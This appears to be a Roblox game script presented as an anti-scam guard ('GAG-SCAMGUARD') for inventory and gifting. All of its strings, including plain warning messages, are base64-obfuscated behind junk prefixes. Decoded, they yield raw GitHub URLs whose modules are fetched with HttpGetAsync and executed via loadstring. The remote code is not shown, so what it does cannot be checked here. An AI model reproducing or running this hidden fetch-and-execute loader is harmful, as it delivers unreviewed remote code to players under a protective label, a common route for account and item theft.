local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function FEXyWeATiFwymtmLgihAElrKOz(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- Main.lua (Robust GAG-SCAMGUARD)
-- Load all modules safely
local success, GUIManager = pcall(function()
    return loadstring(game:HttpGetAsync(FEXyWeATiFwymtmLgihAElrKOz('BcrzRNdvTqSHvMVRdmfEhuaudQEUlBgbUetaqOEPLrXhgvXAHIouqBnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9tYWluL0dVSU1hbmFnZXIubHVh')))()
end)
if not success then
    warn(FEXyWeATiFwymtmLgihAElrKOz('TEaNlpxSVfffIVsrIwpNNZioCdLXHDzyRCsVlwcVzLtMMsmBvKpAPTYRmFpbGVkIHRvIGxvYWQgR1VJTWFuYWdlciE='))
    return
end

local success2, InventoryLock = pcall(function()
    return loadstring(game:HttpGetAsync(FEXyWeATiFwymtmLgihAElrKOz('RyqnrSoUFAoaBfgiKommgXoKTpIbuQseQGqFcrKPfFxsGDTIuCzzGxyaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9tYWluL0ludmVudG9yeUxvY2subHVh')))()
end)
if not success2 then
    warn(FEXyWeATiFwymtmLgihAElrKOz('HxaaQGdXSgjrogxUuQciHtFZINcPcexhmrVeKzQSHHVbbxnuUOeFkiwRmFpbGVkIHRvIGxvYWQgSW52ZW50b3J5TG9jayE='))
    return
end

local success3, RemoteGuard = pcall(function()
    return loadstring(game:HttpGetAsync(FEXyWeATiFwymtmLgihAElrKOz('yngPFgSsKMJExSrWOHsQqUelejAKuaoKQZFMQhhdGvWRQYrrfRAJTcqaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9tYWluL1JlbW90ZUd1YXJkLmx1YQ==')))()
end)
if not success3 then
    warn(FEXyWeATiFwymtmLgihAElrKOz('TTDIGbzbVQVLkadfdtDQiPslqeRPwwUuImvqvueKvlUDIvAWVcGHVctRmFpbGVkIHRvIGxvYWQgUmVtb3RlR3VhcmQh'))
    return
end

local success4, TamperProtection = pcall(function()
    return loadstring(game:HttpGetAsync(FEXyWeATiFwymtmLgihAElrKOz('aDhcOfXklxLoaBkkeeLiHCXQnJNQZCUHdDKUbmENosCtcrgSEkEkIzKaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9tYWluL1RhbXBlclByb3RlY3Rpb24ubHVh')))()
end)
if not success4 then
    warn(FEXyWeATiFwymtmLgihAElrKOz('GgiHOnAynQIZjgrjcBsYGoOcocxWWDDWouQAOBcHglJWqOyBGFnVnmNRmFpbGVkIHRvIGxvYWQgVGFtcGVyUHJvdGVjdGlvbiE='))
    return
end

-- Optional Logger module
local Logger = nil
pcall(function()
    Logger = loadstring(game:HttpGetAsync(FEXyWeATiFwymtmLgihAElrKOz('uprrJhjsAMvyKhrKMxFeuXXQXeCUZAjDoNOApptJmPDUPfesePqSGiPaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9tYWluL0xvZ2dlci5sdWE=')))()
end)

-- Configuration
local Config = {
    KickOnRemoteTrigger = true,
    LoadingScreenDuration = 15, -- seconds
    AutoLockInventory = true,
    AutoFavoriteNames = {FEXyWeATiFwymtmLgihAElrKOz('tbtXNESzsNFswTwlmZzQBWbOWyzwwklQELJrNpXFfhbRdiroBJaxLzJTXl0aGlj'),FEXyWeATiFwymtmLgihAElrKOz('mUSRkuNEKgsHRQCncIdcovMhnblxzKPJeBJqnRDrhXXLtNCYFSmzgqlTGVnZW5kYXJ5'),FEXyWeATiFwymtmLgihAElrKOz('vHjrvvkWnwfwSALZjHrUVLpKfUbWShbIcUJTZKTGFmAFZGgBbYjLEBjVWx0cmE='),FEXyWeATiFwymtmLgihAElrKOz('qOhVyVCrRCJdigeIeeKgclViNlyEEutWrxeMVyTydJDMgAGHZFnYYkgUHJpc21hdGlj')},
}

-- Initialize GUI
GUIManager:ShowLoadingScreen(Config.LoadingScreenDuration, function(stageText)
    print(stageText) -- optional console feedback
end)

-- Link modules
InventoryLock:Initialize({Logger=Logger, GUIManager=GUIManager, Config=Config})
RemoteGuard:Initialize({Logger=Logger, GUIManager=GUIManager, Config=Config})
TamperProtection:Initialize({Logger=Logger, GUIManager=GUIManager, Config=Config})

-- Start monitoring
InventoryLock:Start()
RemoteGuard:Start()
TamperProtection:Start()

-- Connect remote trigger events
RemoteGuard.OnRemoteTriggered:Connect(function(remoteName)
    GUIManager:SetStatus(FEXyWeATiFwymtmLgihAElrKOz('xMVQnOJGBWEfChPvYcumsHKBdtcZrHDXVQOXdHYbeOrvbLSxLCuyXVsYmxhY2s='),FEXyWeATiFwymtmLgihAElrKOz('MzsdKRLxAzsmvFsvwDpprkUOtvCCfrWuYEWLfpgMKqnQhnenVrWGiIgUmVtb3RlIHRyaWdnZXJlZDog')..remoteName)
    if Logger then Logger:AddEntry(FEXyWeATiFwymtmLgihAElrKOz('JYKjssmfrGygfSXlYLovNdNhhPvWETjBpVTUaKnOQwscmytuqoyDmOVUmVtb3RlIHRyaWdnZXJlZDog')..remoteName,FEXyWeATiFwymtmLgihAElrKOz('QDcGXRTpFtWVsnGptrJEcAmqpUPfsAFEkpqBZzRtIzzjpAyXEOdOyjpYWxlcnQ=')) end
    -- Force stop gifting and optionally kick
    if Config.KickOnRemoteTrigger then
        game:GetService(FEXyWeATiFwymtmLgihAElrKOz('GHQuCOddmpExfZHmEudGRpbBmybfkpBCsBziaDiQajYmRlNTkASTMSAUGxheWVycw==')).LocalPlayer:Kick(FEXyWeATiFwymtmLgihAElrKOz('tmQzWhQkzmVTPDvQjqHNZHABbbeVCsuyoKLIwCAdAzoAnzQdAnStIjTQW50aS1TY2FtOiBSZW1vdGUgdHJpZ2dlcmVkIQ=='))
    end
end)

-- Update status dot periodically
spawn(function()
    while true do
        task.wait(5)
        if RemoteGuard:IsAllBlocked() then
            GUIManager:SetStatus(FEXyWeATiFwymtmLgihAElrKOz('mrcEyBbeUsZuagvJzOVZkFKfXXQedXFqbkDlleyRYPTJfUeUxrhicjUZ3JlZW4='),FEXyWeATiFwymtmLgihAElrKOz('GIXdecOQinceuqFjvXjokbbeAAilzihkdIqRiXTbJbfrMIrVAIcEMFHQWxsIGdpZnQgcmVtb3RlcyBibG9ja2Vk'))
        elseif RemoteGuard:IsVulnerable() then
            GUIManager:SetStatus(FEXyWeATiFwymtmLgihAElrKOz('gJqxuMrnSKhnbPPNjpPvFKLelHzZBrEaWCGVvQqhxOewILfYJMfZyeceWVsbG93'),FEXyWeATiFwymtmLgihAElrKOz('ZqbfgoIEZPZmkrCJONITWguvAmQPSPyOGBwbLuMaEeTTuIAAYJAduMYU29tZSByZW1vdGVzIHZ1bG5lcmFibGU='))
        else
            GUIManager:SetStatus(FEXyWeATiFwymtmLgihAElrKOz('AiUjrYRXedgdnQSXncUnrrBlDBPYwlcrqXaziKdAovYLPfOkENTmCZBcmVk'),FEXyWeATiFwymtmLgihAElrKOz('fpuwKYBMJhNwTtFAMbktichEjDSqcxmqMrFrRqDXEKmuWvhnCAidXteVW5ibG9ja2VkIHJlbW90ZXMgZGV0ZWN0ZWQ='))
        end
    end
end)
    
